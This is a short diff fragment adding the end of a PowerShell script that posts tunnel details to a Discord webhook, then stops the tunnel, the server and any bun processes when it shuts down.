+        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $bytes
+        Write-Host "[notify] Details sent!"
+    } catch {
+        Write-Host "[notify] Failed to send: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+} else {
+    Write-Host "[warning] Could not detect tunnel URL." -ForegroundColor Yellow
+}
+
+try {
+    $cfProcess.WaitForExit()
+} finally {
+    Write-Host "[shutdown] Stopping..."
+    Stop-Process -Id $cfProcess.Id -Force -ErrorAction SilentlyContinue
+    Stop-Process -Id $serverProc.Id -Force -ErrorAction SilentlyContinue
+    Get-Process bun -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Write-Host "[shutdown] Done."
+}
